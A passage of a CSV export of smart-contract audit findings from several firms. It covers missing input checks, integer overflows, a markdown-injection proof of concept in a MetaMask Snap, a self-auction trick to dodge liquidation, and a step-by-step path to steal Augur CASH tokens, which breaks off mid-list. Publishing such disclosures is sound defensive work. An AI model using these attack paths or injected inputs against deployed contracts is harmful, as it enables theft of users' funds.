id,key_no,title,audit_company,publish_date,content,protocol,finder_list,impact,tag_list,contest_prize_txt,pdf_page_from,general_score,quality_score,github_link,source_link,pdf_link,contest_link,spider_file,report_key_no,created_time,updated_time,is_valid,content_code,category_list
727978,21893e0d0665e2d286aa260f8ce24c77,Improper initialization of spending condition abstraction allows ‚Äúv2 transactions‚Äù to exit using PaymentExitGame ‚úì¬†Addressed,ConsenSys,2020-01-01,"#### Resolution



This was addressed in [omisego/plasma-contracts#478](https://github.com/omisego/plasma-contracts/pull/478) by requiring that `PaymentStartStandardExit` and `PaymentStartInFlightExit` check the exiting transaction‚Äôs transaction type.


#### Description


`PaymentOutputToPaymentTxCondition` is an abstraction around the transaction signature check needed for many components of the exit games. Its only function, `verify`, returns `true` if one transaction (`inputTxBytes`) is spent by another transaction (`spendingTxBytes`):


**code/plasma\_framework/contracts/src/exits/payment/spendingConditions/PaymentOutputToPaymentTxCondition.sol:L40-L69**



```
function verify(
    bytes calldata inputTxBytes,
    uint16 outputIndex,
    uint256 inputTxPos,
    bytes calldata spendingTxBytes,
    uint16 inputIndex,
    bytes calldata signature,
    bytes calldata /\*optionalArgs\*/
)
    external
    view
    returns (bool)
{
    PaymentTransactionModel.Transaction memory inputTx = PaymentTransactionModel.decode(inputTxBytes);
    require(inputTx.txType == supportInputTxType, ""Input tx is an unsupported payment tx type"");

    PaymentTransactionModel.Transaction memory spendingTx = PaymentTransactionModel.decode(spendingTxBytes);
    require(spendingTx.txType == supportSpendingTxType, ""The spending tx is an unsupported payment tx type"");

    UtxoPosLib.UtxoPos memory utxoPos = UtxoPosLib.build(TxPosLib.TxPos(inputTxPos), outputIndex);
    require(
        spendingTx.inputs[inputIndex] == bytes32(utxoPos.value),
        ""Spending tx points to the incorrect output UTXO position""
    );

    address payable owner = inputTx.outputs[outputIndex].owner();
    require(owner == ECDSA.recover(eip712.hashTx(spendingTx), signature), ""Tx in not signed correctly"");

    return true;
}

```
##### Verification process


The verification process is relatively straightforward. The contract performs some basic input validation, checking that the input transaction‚Äôs `txType` matches `supportInputTxType`, and that the spending transaction‚Äôs `txType` matches `supportSpendingTxType`. These values are set during construction.


Next, `verify` checks that the spending transaction contains an input that matches the position of one of the input transaction‚Äôs outputs.


Finally, `verify` performs an EIP-712 hash on the spending transaction, and ensures it is signed by the owner of the output in question.


##### Implications of the abstraction


The abstraction used requires several files to be visited to fully understand the function of each line of code: `ISpendingCondition`, `PaymentEIP712Lib`, `UtxoPosLib`, `TxPosLib`, `PaymentTransactionModel`, `PaymentOutputModel`, `RLPReader`, `ECDSA`, and `SpendingConditionRegistry`. Additionally, the abstraction obfuscates the underlying spending condition verification primitive where used.


Finally, understanding the abstraction requires an understanding of how `SpendingConditionRegistry` is initialized, as well as the nature of its relationship with `PlasmaFramework` and `ExitGameRegistry`. The aforementioned `txType` values, `supportInputTxType` and `supportSpendingTxType`, are set during construction. Their use in `ExitGameRegistry` seems to suggest they are intended to represent different versions of transaction types, and that separate exit game contracts are meant to handle different transaction types:


**code/plasma\_framework/contracts/src/framework/registries/ExitGameRegistry.sol:L58-L78**



```
/\*\*
 \* @notice Registers an exit game within the PlasmaFramework. Only the maintainer can call the function.
 \* @dev Emits ExitGameRegistered event to notify clients
 \* @param \_txType The tx type where the exit game wants to register
 \* @param \_contract Address of the exit game contract
 \* @param \_protocol The transaction protocol, either 1 for MVP or 2 for MoreVP
 \*/
function registerExitGame(uint256 \_txType, address \_contract, uint8 \_protocol) public onlyFrom(getMaintainer()) {
    require(\_txType != 0, ""Should not register with tx type 0"");
    require(\_contract != address(0), ""Should not register with an empty exit game address"");
    require(\_exitGames[\_txType] == address(0), ""The tx type is already registered"");
    require(\_exitGameToTxType[\_contract] == 0, ""The exit game contract is already registered"");
    require(Protocol.isValidProtocol(\_protocol), ""Invalid protocol value"");

    \_exitGames[\_txType] = \_contract;
    \_exitGameToTxType[\_contract] = \_txType;
    \_protocols[\_txType] = \_protocol;
    \_exitGameQuarantine.quarantine(\_contract);

    emit ExitGameRegistered(\_txType, \_contract, \_protocol);
}

```
##### Migration and initialization


The migration script seems to corroborate this interpretation:


**code/plasma\_framework/migrations/5\_deploy\_and\_register\_payment\_exit\_game.js:L109-L124**



```
// handle spending condition
await deployer.deploy(
    PaymentOutputToPaymentTxCondition,
    plasmaFramework.address,
    PAYMENT\_OUTPUT\_TYPE,
    PAYMENT\_TX\_TYPE,
);
const paymentToPaymentCondition = await PaymentOutputToPaymentTxCondition.deployed();

await deployer.deploy(
    PaymentOutputToPaymentTxCondition,
    plasmaFramework.address,
    PAYMENT\_OUTPUT\_TYPE,
    PAYMENT\_V2\_TX\_TYPE,
);
const paymentToPaymentV2Condition = await PaymentOutputToPaymentTxCondition.deployed();

```
The migration script shown above deploys two different versions of `PaymentOutputToPaymentTxCondition`. The first sets `supportInputTxType` and `supportSpendingTxType` to `PAYMENT_OUTPUT_TYPE` and `PAYMENT_TX_TYPE`, respectively. The second sets those same variables to `PAYMENT_OUTPUT_TYPE` and `PAYMENT_V2_TX_TYPE`, respectively.


The migration script then registers both of these contracts in `SpendingConditionRegistry`, and then calls `renounceOwnership`, freezing the spending conditions registered permanently:


**code/plasma\_framework/migrations/5\_deploy\_and\_register\_payment\_exit\_game.js:L126-L135**



```
console.log(`Registering paymentToPaymentCondition (${paymentToPaymentCondition.address}) to spendingConditionRegistry`);
await spendingConditionRegistry.registerSpendingCondition(
    PAYMENT\_OUTPUT\_TYPE, PAYMENT\_TX\_TYPE, paymentToPaymentCondition.address,
);

console.log(`Registering paymentToPaymentV2Condition (${paymentToPaymentV2Condition.address}) to spendingConditionRegistry`);
await spendingConditionRegistry.registerSpendingCondition(
    PAYMENT\_OUTPUT\_TYPE, PAYMENT\_V2\_TX\_TYPE, paymentToPaymentV2Condition.address,
);
await spendingConditionRegistry.renounceOwnership();

```
Finally, the migration script registers a single exit game contract in `PlasmaFramework`:


**code/plasma\_framework/migrations/5\_deploy\_and\_register\_payment\_exit\_game.js:L137-L143**



```
// register the exit game to framework
await plasmaFramework.registerExitGame(
    PAYMENT\_TX\_TYPE,
    paymentExitGame.address,
    config.frameworks.protocols.moreVp,
    { from: maintainerAddress },
);

```
Note that the associated `_txType` is permanently associated with the deployed exit game contract:


**code/plasma\_framework/contracts/src/framework/registries/ExitGameRegistry.sol:L58-L78**



```
/\*\*
 \* @notice Registers an exit game within the PlasmaFramework. Only the maintainer can call the function.
 \* @dev Emits ExitGameRegistered event to notify clients
 \* @param \_txType The tx type where the exit game wants to register
 \* @param \_contract Address of the exit game contract
 \* @param \_protocol The transaction protocol, either 1 for MVP or 2 for MoreVP
 \*/
function registerExitGame(uint256 \_txType, address \_contract, uint8 \_protocol) public onlyFrom(getMaintainer()) {
    require(\_txType != 0, ""Should not register with tx type 0"");
    require(\_contract != address(0), ""Should not register with an empty exit game address"");
    require(\_exitGames[\_txType] == address(0), ""The tx type is already registered"");
    require(\_exitGameToTxType[\_contract] == 0, ""The exit game contract is already registered"");
    require(Protocol.isValidProtocol(\_protocol), ""Invalid protocol value"");

    \_exitGames[\_txType] = \_contract;
    \_exitGameToTxType[\_contract] = \_txType;
    \_protocols[\_txType] = \_protocol;
    \_exitGameQuarantine.quarantine(\_contract);

    emit ExitGameRegistered(\_txType, \_contract, \_protocol);
}

```
##### Conclusion


Crucially, this association is never used. It is implied heavily that transactions with some `txType` must use a certain registered exit game contract. In fact, this is not true. When using `PaymentExitGame`, its routers, and their associated controllers, the `txType` is invariably inferred from the encoded transaction, not from the mappings in `ExitGameRegistry`. If initialized as-is, both `PAYMENT_TX_TYPE` and `PAYMENT_V2_TX_TYPE` transactions may be exited using `PaymentExitGame`, provided they exist in the plasma chain.


#### Recommendation


* Remove `PaymentOutputToPaymentTxCondition` and `SpendingConditionRegistry`
* Implement checks for specific spending conditions directly in exit game controllers. Emphasize clarity of function: ensure it is clear when called from the top level that a signature verification check and spending condition check are being performed.
* If the inferred relationship between `txType` and `PaymentExitGame` is correct, ensure that each `PaymentExitGame` router checks for its supported `txType`. Alternatively, the check could be made in `PaymentExitGame` itself.


Corresponding issue in plasma-contracts repo: <https://github.com/omisego/plasma-contracts/issues/472>",OmiseGo MoreVP,Daniel Luca| Martin Ortner|Alexander Wade,HIGH,,,0,0,0,,https://consensys.net/diligence/audits/2020/01/omisego-morevp/,,,solodit_reports,,2023-09-22 02:36:58,2024-10-14 21:07:03,1,,Dexes|CDP|Services|Cross Chain|Options Vault
731226,191a80082ee98207de876897d29fc2fa,[H-01]  Someone can create non-liquidatable auction if the collateral asset fails on transferring to address(0),Code4rena,2022-07-14,"# Lines of code

https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L176
https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L399


# Vulnerability details

## Impact
might lead to systematic debt. Cause errors for liquidators to run normally.

## Proof of Concept
In the function `auction`, there is on input validation around whether the `to` is `address(0)` or not. and if the `auctioneerReward` is set to an value > 0 (as default),  each liquidate call will call `Join` module to pay out to `auctioneer` with the following line:

```jsx
if (auctioneerCut > 0) {
    ilkJoin.exit(auction_.auctioneer, auctioneerCut.u128());
}
```

This line will revert if `auctioneer` is set to `address(0)` on some tokens (revert on transferring to address(0) is a [default behaviour of the OpenZeppelin template](https://www.notion.so/Yield-Witch-555e6981c26b41008d03a504077b4770)). So if someone start an `auction` with `to = address(0)`, this auction becomes un-liquidatable.

A malicious user can run a bot to monitor his own vault, and if the got underwater and they don‚Äôt have enough collateral to top up, they can immediately start an auction on their own vault and set actioneer to `0` to avoid actually being liquidated, which breaks the design of the system.


## Recommended Mitigation Steps

Add check while starting an auction:

```jsx
function auction(bytes12 vaultId, address to)
    external
    returns (DataTypes.Auction memory auction_)
{
    require (to != address(0), ""invalid auctioneer"");
		...
}		
```",Yield,0x52|antonttc,HIGH,Weird ERC20|ERC20,"$25,000 USDC",0,4,5,https://github.com/code-423n4/2022-07-yield-findings/issues/116,https://code4rena.com/reports/2022-07-yield,,https://code4rena.com/contests/2022-07-yield-witch-v2-contest,solodit_reports,d42373166d4e2ff9d90b258f1a289166,2023-09-22 02:41:45,2024-10-14 22:51:33,1,,Liquid Staking|Dexes|CDP|Yield|Services
733282,83be7935c403b8b0675d37bece497750,H-2: Missing input validation for _rewardProportion parameter allows keeper to escalate his privileges and pay back all loans,Sherlock,2023-03-13,"# Issue H-2: Missing input validation for _rewardProportion parameter allows keeper to escalate his privileges and pay back all loans 

Source: https://github.com/sherlock-audit/2023-03-taurus-judging/issues/11 

## Found by 
roguereddwarf, cducrest-brainbot

## Summary
According to the Contest page and discussion with the sponsor, the role of a `keeper` is to perform liquidations and to swap yield token for `TAU` using the `SwapHandler.swapForTau` function:
https://github.com/sherlock-audit/2023-03-taurus/blob/main/taurus-contracts/contracts/Vault/SwapHandler.sol#L45-L52

They are also able to choose how much yield token to swap and what the proportion of the resulting TAU is that is distributed to users vs. not distributed in order to erase bad debt.

So a `keeper` is not trusted to perform any actions that go beyond swapping yield / performing liquidations.

However there is a missing input validation for the `_rewardProportion` parameter in the `SwapHandler.swapForTau` function.
This allows a keeper to ""erase"" all debt of users.
So users can withdraw their collateral without paying any of the debt.

## Vulnerability Detail
By looking at the code we can see that `_rewardProportion` is used to determine the amount of `TAU` that `_withholdTau` is called with:
[Link](https://github.com/sherlock-audit/2023-03-taurus/blob/main/taurus-contracts/contracts/Vault/SwapHandler.sol#L91)
```solidity
_withholdTau((tauReturned * _rewardProportion) / Constants.PERCENT_PRECISION);
```

Any value of `_rewardProportion` greater than `1e18` means that more `TAU` will be distributed to users than has been burnt (aka erasing debt).

It is easy to see how the `keeper` can chose the number so big that `_withholdTau` is called with a value close to `type(uint256).max` which will certainly be enough to erase all debt.

## Impact
A `keeper` can escalate his privileges and erase all debt.
This means that `TAU` will not be backed by any collateral anymore and will be worthless.

## Code Snippet
https://github.com/sherlock-audit/2023-03-taurus/blob/main/taurus-contracts/contracts/Vault/SwapHandler.sol#L45-L101

## Tool used
Manual Review

## Recommendation
I discussed this issue with the sponsor and it is intended that the `keeper` role can freely chose the value of the `_rewardProportion` parameter within the `[0,1e18]` range, i.e. 0%-100%.

Therefore the fix is to simply check that `_rewardProportion` is not bigger than `1e18`:
```diff
diff --git a/taurus-contracts/contracts/Vault/SwapHandler.sol b/taurus-contracts/contracts/Vault/SwapHandler.sol
index c04e3a4..ab5064b 100644
--- a/taurus-contracts/contracts/Vault/SwapHandler.sol
+++ b/taurus-contracts/contracts/Vault/SwapHandler.sol
@@ -59,6 +59,10 @@ abstract contract SwapHandler is FeeMapping, TauDripFeed {
             revert zeroAmount();
         }
 
+        if (_rewardProportion > Constants.PERCENT_PRECISION) [
+            revert invalidRewardProportion();
+        ]
+
         // Get and validate swap adapter address
         address swapAdapterAddress = SwapAdapterRegistry(controller).swapAdapters(_swapAdapterHash);
         if (swapAdapterAddress == address(0)) {
```

## Discussion

**Sierraescape**

https://github.com/protokol/taurus-contracts/pull/121",Taurus,cducrest-brainbot|roguereddwarf,HIGH,,25000 USDC,0,4,5,https://github.com/sherlock-audit/2023-03-taurus-judging/issues/11,,,https://app.sherlock.xyz/audits/contests/45,solodit_reports,,2023-09-22 02:44:44,2024-10-14 23:37:41,1,_withholdTau((tauReturned * _rewardProportion) / Constants.PERCENT_PRECISION);,Dexes|CDP|Services|Cross Chain|Synthetics
734218,869743ae7815a67803c7fb4ff1db2438,"Lax Input Validation, Control Char, URI, and Markdown Injection ‚úì¬†Fixed",ConsenSys,2023-07-01,"#### Resolution



addressed in [ethereum-push-notification-service/push-protocol-snaps@1a6a32ef760088ca59f73e555f41b5b5d871f761](https://github.com/ethereum-push-notification-service/push-protocol-snaps/tree/1a6a32ef760088ca59f73e555f41b5b5d871f761) validating the address with `ethers.utils.isAddress`.


**Update 1**:


* Markdown rendering of newlines fixed with: [ethereum-push-notification-service/push-protocol-snaps@7ee018947303014e8c14e9413a5edd9fd29f9829](https://github.com/ethereum-push-notification-service/push-protocol-snaps/commit/7ee018947303014e8c14e9413a5edd9fd29f9829)
* **Major:** Markdown Injection in Confirmation Dialogue re-introduced with [ethereum-push-notification-service/push-protocol-snaps@7ee018947303014e8c14e9413a5edd9fd29f9829](https://github.com/ethereum-push-notification-service/push-protocol-snaps/commit/7ee018947303014e8c14e9413a5edd9fd29f9829)


**Update 2**:


Markdown Injection in Confirmation Dialogue fixed with [ethereum-push-notification-service/push-protocol-snaps@b40e141243c77bfd7ec109408b326607b19314c8](https://github.com/ethereum-push-notification-service/push-protocol-snaps/commit/b40e141243c77bfd7ec109408b326607b19314c8)




#### Description


There is no input validation on the `address` to be added. The input may be an ethereum address but can be anything, potentially breaking security assumptions in the code and leading to unwanted side effects.


* `request.params` may be `null`, and
* `request.params.address` may not be an ethereum address.


**snap/src/index.ts:L18**



```
await addAddress(request.params.address || ""0x0"");

```
#### Example


![img]()![img](./img/246877719-5f85fba3-fa7c-47e6-9775-de39376ea486.png)



```
await window.ethereum?.request({
 method: ""wallet\_invokeSnap"",
 params: {
 snapId: ""local:http://localhost:8080"",
 request: { method: 'hello', params: { address: ""Hi üôå\n\n üî∏ \*\*boom\*\*"" } },
 }})

```
* URI injection if address contains `?#/`


**snap/src/utils/fetchnotifs.ts:L3-L13**



```
export const getNotifications=async(address:string)=>{
 const url = `https://backend-prod.epns.io/apis/v1/users/eip155:5:${address}/feeds`;
 const response = await fetch(url, {
 method: 'get',
 headers: {
 'Content-Type': 'application/json',
 },
 });
 const data = await response.json();
 return data;
 }

```
* Injection in notifications


**snap/src/utils/popupHelper.ts:L3-L12**



```
export const popupHelper = (notifs: String[]) => {
 let msg = [];
 if (notifs.length > 0) {
 notifs.forEach((notif) => {
 let str = `\nüîî` + notif + ""\n"";
 msg.push(str);
 });
 }
 return msg;
};

```
* Markdown injection


**snap/src/utils/fetchAddress.ts:L45-L52**



```
const data = persistedData.addresses;
const popup = persistedData.popuptoggle;
let msg='';
for(let i = 0; i < data!.length; i++){
 msg = msg + 'üîπ' + data![i] + '\n';
}
return snap.request({
 method: 'snap\_dialog',

```
Also, note that the currently rendered markdown that lists addresses appears wrong, as markdown newlines require `\n\n` instead of `\n`.


#### Recommendation


Strictly validate inputs from external origins. Ensure that the provided address is a valid ethereum address. Optionally check the addresses checksum to detect typos. Ensure that inputs may not lead to renderable markdown. Fix the rendered list of addresses to properly display as a newline‚Äôd list. Ensure untrusted inputs cannot inject context-sensitive information into fetch urls.",Push Protocol Snap for MetaMask,Martin Ortner,HIGH,,,0,0,0,,https://consensys.net/diligence/audits/2023/07/push-protocol-snap-for-metamask/,,,solodit_reports,,2023-09-22 02:46:03,2024-10-14 23:57:54,1,,
759913,2ca58c2659412c09a1a4772427978112,bitcoin-spv - multiple integer under-/overflows ‚úì¬†Addressed,ConsenSys,2020-02-01,"#### Resolution



This was partially addressed in <https://github.com/summa-tx/bitcoin-spv/pull/118,> <https://github.com/summa-tx/bitcoin-spv/pull/119,> and [summa-tx/bitcoin-spv#122](https://github.com/summa-tx/bitcoin-spv/pull/122).


* Summa opted not to fix the underflow in `extractTarget`.
* In <https://github.com/summa-tx/bitcoin-spv/pull/118,> the `determineOutputLength` overflow was addressed by casting `_len` to a `uint256` before addition.
* In <https://github.com/summa-tx/bitcoin-spv/pull/119,> the `extractHash` underflow was addressed by returning an empty `bytes` array if the extracted length would cause underflow. Note that an explicit error and transaction revert is favorable in these cases, in order to avoid returning unusable data to the calling function.
* Underflow and overflow in `BytesLib` was addressed in [summa-tx/bitcoin-spv#122](https://github.com/summa-tx/bitcoin-spv/pull/122). Multiple requires were added to the mentioned functions, ensuring memory reads stayed in-bounds for each array. A later change in [summa-tx/bitcoin-spv#128](https://github.com/summa-tx/bitcoin-spv/pull/128) added support for `slice` with a length of 0.




#### Description


The bitcoin-spv library allows for multiple integer under-/overflows while processing or converting potentially untrusted or user-provided data.


#### Examples


* `uint8` underflow `uint256(uint8(_e - 3))`


**Note**: `_header[75]` will throw consuming all gas if out of bounds while the majority of the library usually uses `slice(start, 1)` to handle this more gracefully.


**bitcoin-spv/solidity/contracts/BTCUtils.sol:L483-L494**



```
/// @dev Target is a 256 bit number encoded as a 3-byte mantissa and 1 byte exponent
/// @param \_header The header
/// @return The target threshold
function extractTarget(bytes memory \_header) internal pure returns (uint256) {
    bytes memory \_m = \_header.slice(72, 3);
    uint8 \_e = uint8(\_header[75]);
    uint256 \_mantissa = bytesToUint(reverseEndianness(\_m));
    uint \_exponent = \_e - 3;

    return \_mantissa \* (256 \*\* \_exponent);
}


```
* `uint8` overflow `uint256(uint8(_len + 8 + 1))`


**Note**: might allow a specially crafted output to return an invalid determineOutputLength <= 9.


**Note**: while type `VarInt` is implemented for inputs, it is not for the output length.


**bitcoin-spv/solidity/contracts/BTCUtils.sol:L295-L304**



```
/// @dev 5 types: WPKH, WSH, PKH, SH, and OP\_RETURN
/// @param \_output The output
/// @return The length indicated by the prefix, error if invalid length
function determineOutputLength(bytes memory \_output) internal pure returns (uint256) {
    uint8 \_len = uint8(\_output.slice(8, 1)[0]);
    require(\_len < 0xfd, ""Multi-byte VarInts not supported"");

    return \_len + 8 + 1; // 8 byte value, 1 byte for \_len itself
}


```
* `uint8` underflow `uint256(uint8(extractOutputScriptLen(_output)[0]) - 2)`


**bitcoin-spv/solidity/contracts/BTCUtils.sol:L366-L378**



```
/// @dev Determines type by the length prefix and validates format
/// @param \_output The output
/// @return The hash committed to by the pk\_script, or null for errors
function extractHash(bytes memory \_output) internal pure returns (bytes memory) {
    if (uint8(\_output.slice(9, 1)[0]) == 0) {
        uint256 \_len = uint8(extractOutputScriptLen(\_output)[0]) - 2;
        // Check for maliciously formatted witness outputs
        if (uint8(\_output.slice(10, 1)[0]) != uint8(\_len)) {
            return hex"""";
        }
        return \_output.slice(11, \_len);
    } else {
        bytes32 \_tag = \_output.keccak256Slice(8, 3);

```
* `BytesLib` input validation multiple start+length overflow


**Note**: multiple occurrences. should check `start+length > start && bytes.length >= start+length`


**bitcoin-spv/solidity/contracts/BytesLib.sol:L246-L248**



```
function slice(bytes memory \_bytes, uint \_start, uint \_length) internal  pure returns (bytes memory res) {
    require(\_bytes.length >= (\_start + \_length), ""Slice out of bounds"");


```
* `BytesLib` input validation multiple start overflow


**bitcoin-spv/solidity/contracts/BytesLib.sol:L280-L281**



```
function toUint(bytes memory \_bytes, uint \_start) internal  pure returns (uint256) {
    require(\_bytes.length >= (\_start + 32), ""Uint conversion out of bounds."");

```
**bitcoin-spv/solidity/contracts/BytesLib.sol:L269-L270**



```
function toAddress(bytes memory \_bytes, uint \_start) internal  pure returns (address) {
    require(\_bytes.length >= (\_start + 20), ""Address conversion out of bounds."");

```
**bitcoin-spv/solidity/contracts/BytesLib.sol:L246-L248**



```
function slice(bytes memory \_bytes, uint \_start, uint \_length) internal  pure returns (bytes memory res) {
    require(\_bytes.length >= (\_start + \_length), ""Slice out of bounds"");


```
**bitcoin-spv/solidity/contracts/BytesLib.sol:L410-L412**



```
function keccak256Slice(bytes memory \_bytes, uint \_start, uint \_length) pure internal returns (bytes32 result) {
    require(\_bytes.length >= (\_start + \_length), ""Slice out of bounds"");


```
#### Recommendation


We believe that a general-purpose parsing and verification library for bitcoin payments should be very strict when processing untrusted user input. With strict we mean, that it should rigorously validate provided input data and only proceed with the processing of the data if it is within a safe-to-use range for the method to return valid results. Relying on the caller to provide pre-validate data can be unsafe especially if the caller assumes that proper input validation is performed by the library.


Given the risk profile for this library, we recommend a conservative approach that balances security instead of gas efficiency without relying on certain calls or instructions to throw on invalid input.


For this issue specifically, we recommend proper input validation and explicit type expansion where necessary to prevent values from wrapping or processing data for arguments that are not within a safe-to-use range.",Thesis - tBTC and Keep,Alexander Wade|Martin Ortner,HIGH,,,0,0,0,,https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/,,,solodit_reports,,2023-09-22 02:37:10,2024-10-14 21:13:13,1,,Dexes|Services|Cross Chain|Insurance
759980,fb39b3ceca54209e8cf49267d03d2a00,[C02] CASH tokens can be stolen from the Market contract,OpenZeppelin,2020-02-27,"By exploiting the critical vulnerability described in **‚Äú[C01] All CASH tokens approved to Augur can be emptied‚Äù**, any malicious user can move all CASH tokens approved to Augur, sending them to Market contracts. But the attacker does not *directly* benefit from the attack.


However, a severe attack vector has been identified in the Market contract that would allow the attacker to actually steal all tokens previously moved to the Market contract. Therefore, this issue should be considered as an extension of **‚Äú[C01] All CASH tokens approved to Augur can be emptied‚Äù**. Following, we set out to describe step by step how an attacker can leverage a malicious universe and the lack of input validations to finally move the CASH tokens to any address in their control.


Once the approved CASH tokens are moved to the `Market` contract (described in **‚Äú[C01] All CASH tokens approved to Augur can be emptied‚Äù**), the [`MarketFactory`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol) [contract](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol) calls the market‚Äôs [`initialize`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L63) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L63). This means that:


* 1.1) Market‚Äôs [`owner`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L78) and [`repBondOwner`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L79) are set to the victim‚Äôs address (*i.e.* the `_sender` parameter).
* 1.2) Market‚Äôs [`universe`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L75) is set to an attacker controlled `IUniverse` contract.
* 1.3) The market [adds a new](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L87) [`InitialReporter`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L87) [to the](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L87) [p`articipants`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L87) [`array`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L87), the attacker being the [`designatedReporter`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol#L22) of the added `InitialReporter` contract.
* 1.4) Market‚Äôs [`repBond`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L98) [is set to](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L98) [`0`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L98), as `universe.getOrCacheMarketRepBond()` is controlled by the attacker.
* 1.5) Market‚Äôs [`validityBondAttoCash`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L100) [is set](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L100) to the entire CASH balance of the `Market` contract.


Now, when the market‚Äôs `endTime` passes (this parameter is attacker-controlled too, and [set during initialization](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L81)), the attacker can either submit an initial report or just wait the 24 hours until public reporting is allowed. In any case, the `Market` has to be reported as ‚ÄúInvalid‚Äù.


* 2.1) Regardless of when the attacker submits the initial report, the transfer operations in [lines 151 and 152](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L151-L152) or [line 154](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L154) of `Market.sol` will move `0` REP tokens, as `_initialReportStake` is the same as `repBond` and `repBond` was set to zero (see 1.4).
* 2.2) In [line 140](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L140) the `disputeWindow` of the `Market` is initialized by the attacker-controlled `universe`.
* 2.3) In [line 141](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L141) (then [lines 46 and 47 of](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol#L46-L47) [`InitialReporter.sol`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol#L46-L47)) the attacker gets registered as the `owner` and `actualReporter` of the `InitialReporter` contract.
* 2.4) Then, in [line 50 of](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol#L50) [`InitialReporter.sol`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol#L50) the `payoutNumerators` is set to the attacker-controlled `_payoutNumerators`, such that `payouNumerators[0] > 0`, so the `Market` is reported as ‚ÄúInvalid‚Äù. From now on, the function [`getPayoutNumerator(0)`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/BaseReportingParticipant.sol#L54) (inherited from the `BaseReportingParticipant` contract) will always return a value greater than zero.
* 2.5) In [line 51](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol#L51) of `InitialReporter.sol` the `size` is set to zero.


Finally, the attacker calls the [`finalize`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L235) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L235) on the `Market` contract.


* 3.1) The `require` statement in [line 236](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L236) of `Market.sol` is verified correctly.
